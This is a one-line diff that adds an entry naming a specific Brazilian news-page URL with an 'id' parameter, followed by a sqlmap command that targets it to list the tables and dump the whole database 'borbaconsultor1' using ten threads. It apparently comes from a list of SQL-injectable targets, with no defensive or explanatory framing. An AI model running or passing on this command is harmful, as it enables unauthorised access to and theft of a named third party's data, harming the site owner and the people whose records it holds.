@@ -1,0 +1,1 @@
+http://www.sppe.com.br/noticias.php?id=883 (GET)  # sqlmap.py -u http://www.sppe.com.br/noticias.php?id=883 -D borbaconsultor1 --tables --dump-all --threads 10 -v3
